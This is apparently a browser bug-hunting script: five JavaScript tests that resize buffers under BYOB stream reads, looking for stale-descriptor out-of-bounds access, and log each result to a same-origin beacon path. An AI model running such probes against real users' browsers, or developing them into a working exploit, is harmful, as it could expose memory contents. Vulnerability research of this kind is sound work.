// p355 - BYOB ReadableStream + ResizableArrayBuffer stale descriptor attack
//
// Bug hypothesis: readableByteStreamControllerPullInto captures view.byteOffset
// and view.byteLength at read() time into pullIntoDescriptor. If the RAB is
// resized between read() and when data is copied from the queue via
// fillDescriptorFromQueue, the Uint8Array.set() at line 495 uses stale
// destStart on a now-smaller buffer.
//
// Also tests respondWithNewView with a view on a resized RAB.
//
// Beacon prefix: V355-

(function() {
  var BQ = 0;
  function B(tag) {
    try { new Image().src = '/beacon/V355-' + tag + '?t=' + Date.now() + '&q=' + (BQ++); } catch(e) {}
  }

  B('BOOT');

  // Feature gates
  try { new ArrayBuffer(8, {maxByteLength: 64}); } catch(e) { B('NO-RAB'); return; }
  try {
    var _s = new ReadableStream({type: 'bytes', start: function(c) { c.close(); }});
    B('BYTE-STREAM-OK');
  } catch(e) { B('NO-BYTE-STREAM'); return; }

  // Test 1: BYOB read with RAB view, resize down before data arrives
  try {
    var rab1 = new ArrayBuffer(1024, {maxByteLength: 8192});
    var view1 = new Uint8Array(rab1);
    for (var i = 0; i < 1024; i++) view1[i] = 0;

    var ctrl1;
    var pullCount1 = 0;
    var stream1 = new ReadableStream({
      type: 'bytes',
      pull: function(controller) {
        pullCount1++;
        ctrl1 = controller;
        B('T1-PULL-' + pullCount1);

        if (pullCount1 === 1) {
          // Resize RAB down BEFORE responding
          B('T1-BYOB-VIEW-LEN-' + (controller.byobRequest ? controller.byobRequest.view.byteLength : 'null'));

          try {
            rab1.resize(16);
            B('T1-RESIZED-TO-16');
          } catch(e) {
            B('T1-RESIZE-ERR-' + e.message.substring(0, 30));
          }

          // Check if BYOB request view reflects resize
          if (controller.byobRequest) {
            B('T1-AFTER-RESIZE-VIEW-LEN-' + controller.byobRequest.view.byteLength);
            B('T1-AFTER-RESIZE-VIEW-OFF-' + controller.byobRequest.view.byteOffset);

            // Try to respond with bytes
            try {
              // Write some data to the view region that IS within bounds
              var bview = controller.byobRequest.view;
              if (bview.byteLength > 0) {
                for (var k = 0; k < Math.min(bview.byteLength, 8); k++) {
                  bview[k] = 0xBB;
                }
                controller.byobRequest.respond(Math.min(bview.byteLength, 8));
                B('T1-RESPOND-OK');
              } else {
                B('T1-VIEW-ZERO-LEN');
                // Try respond with 0
                try {
                  controller.byobRequest.respond(0);
                  B('T1-RESPOND-ZERO-OK');
                } catch(e2) {
                  B('T1-RESPOND-ZERO-ERR-' + e2.message.substring(0, 30));
                }
              }
            } catch(e) {
              B('T1-RESPOND-ERR-' + e.message.substring(0, 40));
            }
          } else {
            B('T1-NO-BYOB-REQ');
          }
        }
      }
    });

    var reader1 = stream1.getReader({mode: 'byob'});
    B('T1-READER-OK');

    // Read with a view on the RAB (1024 bytes)
    var readView1 = new Uint8Array(rab1, 0, 1024);
    B('T1-READ-VIEW-LEN-' + readView1.byteLength);

    reader1.read(readView1).then(function(result) {
      B('T1-RESULT-DONE-' + result.done);
      if (result.value) {
        B('T1-RESULT-LEN-' + result.value.byteLength);
        B('T1-RESULT-TYPE-' + result.value.constructor.name);
        B('T1-RESULT-BUF-LEN-' + result.value.buffer.byteLength);
        if (result.value.byteLength > 0) {
          B('T1-RESULT-V0-' + result.value[0]);
        }
      }
    }).catch(function(e) {
      B('T1-READ-ERR-' + e.message.substring(0, 40));
    });
  } catch(e) { B('T1-ERR-' + e.message.substring(0, 40)); }

  // Test 2: Enqueue data, then BYOB read with RAB view that was resized
  // Tests fillDescriptorFromQueue path with stale descriptor
  try {
    var rab2 = new ArrayBuffer(512, {maxByteLength: 4096});
    var enqueueData = new Uint8Array(256);
    for (var i = 0; i < 256; i++) enqueueData[i] = 0xCC;

    var stream2 = new ReadableStream({
      type: 'bytes',
      start: function(controller) {
        // Pre-enqueue data into the stream's internal queue
        controller.enqueue(enqueueData);
        B('T2-ENQUEUED-256');
      }
    });

    var reader2 = stream2.getReader({mode: 'byob'});

    // Create view on RAB
    var readView2 = new Uint8Array(rab2, 0, 512);
    B('T2-VIEW-LEN-' + readView2.byteLength);

    // Resize RAB DOWN before reading
    rab2.resize(32);
    B('T2-RESIZED-TO-32');
    B('T2-VIEW-AFTER-RESIZE-LEN-' + readView2.byteLength);

    // Now read with the OOB view
    reader2.read(readView2).then(function(result) {
      B('T2-RESULT-DONE-' + result.done);
      if (result.value) {
        B('T2-RESULT-LEN-' + result.value.byteLength);
        B('T2-RESULT-BUF-LEN-' + result.value.buffer.byteLength);
        // Check if we got data past the resized boundary
        var sum = 0;
        for (var j = 0; j < result.value.byteLength; j++) sum += result.value[j];
        B('T2-RESULT-SUM-' + sum);
        if (result.value.byteLength > 32) {
          B('T2-OOB-READ-' + result.value.byteLength);
        }
      }
    }).catch(function(e) {
      B('T2-READ-ERR-' + e.message.substring(0, 40));
    });
  } catch(e) { B('T2-ERR-' + e.message.substring(0, 40)); }

  // Test 3: respondWithNewView with a view on a RAB
  try {
    var rab3 = new ArrayBuffer(256, {maxByteLength: 4096});
    var ctrl3;

    var stream3 = new ReadableStream({
      type: 'bytes',
      pull: function(controller) {
        ctrl3 = controller;
        B('T3-PULL');

        if (!controller.byobRequest) {
          B('T3-NO-BYOB-REQ');
          return;
        }

        // Create a NEW view on the RAB for respondWithNewView
        var origView = controller.byobRequest.view;
        B('T3-ORIG-VIEW-LEN-' + origView.byteLength);
        B('T3-ORIG-VIEW-OFF-' + origView.byteOffset);

        // Write data
        for (var k = 0; k < origView.byteLength; k++) {
          origView[k] = 0xDD;
        }

        // Create a new view on a DIFFERENT RAB for respondWithNewView
        var rab3b = new ArrayBuffer(origView.byteLength, {maxByteLength: 4096});
        var newView = new Uint8Array(rab3b, 0, origView.byteLength);
        for (var k = 0; k < newView.byteLength; k++) newView[k] = 0xEE;

        try {
          controller.byobRequest.respondWithNewView(newView);
          B('T3-RESPOND-NEW-VIEW-OK');

          // Now resize the RAB that the new view was on
          rab3b.resize(8);
          B('T3-RAB3B-RESIZED-TO-8');
        } catch(e) {
          B('T3-RESPOND-NEW-ERR-' + e.message.substring(0, 40));
          // Fallback: just respond normally
          try {
            controller.byobRequest.respond(origView.byteLength);
            B('T3-FALLBACK-RESPOND-OK');
          } catch(e2) {
            B('T3-FALLBACK-ERR-' + e2.message.substring(0, 30));
          }
        }
      }
    });

    var reader3 = stream3.getReader({mode: 'byob'});
    var readView3 = new Uint8Array(rab3, 0, 256);
    B('T3-READ-VIEW-LEN-' + readView3.byteLength);

    reader3.read(readView3).then(function(result) {
      B('T3-RESULT-DONE-' + result.done);
      if (result.value) {
        B('T3-RESULT-LEN-' + result.value.byteLength);
        B('T3-RESULT-BUF-LEN-' + result.value.buffer.byteLength);
        var maxBL = -1;
        try { maxBL = result.value.buffer.maxByteLength; } catch(e) {}
        B('T3-RESULT-BUF-MAX-' + maxBL);
        B('T3-RESULT-RESIZABLE-' + (maxBL > result.value.buffer.byteLength));
        if (result.value.byteLength > 0) {
          B('T3-RESULT-V0-' + result.value[0]);
        }
      }
    }).catch(function(e) {
      B('T3-READ-ERR-' + e.message.substring(0, 40));
    });
  } catch(e) { B('T3-ERR-' + e.message.substring(0, 40)); }

  // Test 4: Auto-allocate BYOB with RAB-backed controller enqueue
  try {
    var rab4 = new ArrayBuffer(128, {maxByteLength: 2048});
    var v4 = new Uint8Array(rab4);
    for (var i = 0; i < 128; i++) v4[i] = 0xFF;

    var stream4 = new ReadableStream({
      type: 'bytes',
      autoAllocateChunkSize: 1024,
      pull: function(controller) {
        B('T4-PULL');
        // Enqueue RAB-backed view
        controller.enqueue(v4);
        B('T4-ENQUEUED-RAB-VIEW');
        // Resize RAB right after enqueue
        rab4.resize(8);
        B('T4-RESIZED-AFTER-ENQUEUE');
      }
    });

    var reader4 = stream4.getReader();
    reader4.read().then(function(result) {
      B('T4-RESULT-DONE-' + result.done);
      if (result.value) {
        B('T4-RESULT-LEN-' + result.value.byteLength);
        var sum = 0;
        for (var j = 0; j < Math.min(result.value.byteLength, 16); j++) sum += result.value[j];
        B('T4-RESULT-SUM16-' + sum);
        // Check if data from BEFORE resize leaked through
        if (result.value.byteLength > 8) {
          B('T4-STALE-DATA-' + result.value.byteLength);
        }
      }
    }).catch(function(e) {
      B('T4-READ-ERR-' + e.message.substring(0, 40));
    });
  } catch(e) { B('T4-ERR-' + e.message.substring(0, 40)); }

  // Test 5: Multiple BYOB reads on same RAB, resize between reads
  try {
    var rab5 = new ArrayBuffer(512, {maxByteLength: 4096});
    var pullCount5 = 0;

    var stream5 = new ReadableStream({
      type: 'bytes',
      pull: function(controller) {
        pullCount5++;
        B('T5-PULL-' + pullCount5);
        if (controller.byobRequest) {
          var bv = controller.byobRequest.view;
          B('T5-BYOB-LEN-' + bv.byteLength);
          B('T5-BYOB-OFF-' + bv.byteOffset);
          if (bv.byteLength > 0) {
            for (var k = 0; k < bv.byteLength; k++) bv[k] = pullCount5;
            controller.byobRequest.respond(bv.byteLength);
            B('T5-RESPONDED-' + bv.byteLength);
          } else {
            B('T5-VIEW-ZERO-CLOSE');
            controller.close();
          }
        }
      }
    });

    var reader5 = stream5.getReader({mode: 'byob'});

    // First read with 256 bytes
    var rv5a = new Uint8Array(rab5, 0, 256);
    B('T5-READ1-LEN-' + rv5a.byteLength);

    reader5.read(rv5a).then(function(r1) {
      B('T5-R1-LEN-' + (r1.value ? r1.value.byteLength : 'null'));

      // Resize RAB down between reads
      rab5.resize(64);
      B('T5-RESIZED-TO-64');

      // Second read with view that is now OOB
      var rv5b = new Uint8Array(rab5, 0); // auto-length = 64
      B('T5-READ2-LEN-' + rv5b.byteLength);

      return reader5.read(rv5b);
    }).then(function(r2) {
      B('T5-R2-LEN-' + (r2.value ? r2.value.byteLength : 'null'));
      B('T5-R2-BUF-LEN-' + (r2.value ? r2.value.buffer.byteLength : 'null'));
    }).catch(function(e) {
      B('T5-ERR-' + e.message.substring(0, 40));
    });
  } catch(e) { B('T5-ERR-' + e.message.substring(0, 40)); }

  B('DONE');
  setTimeout(function() { B('TIMEOUT'); }, 20000);
})();
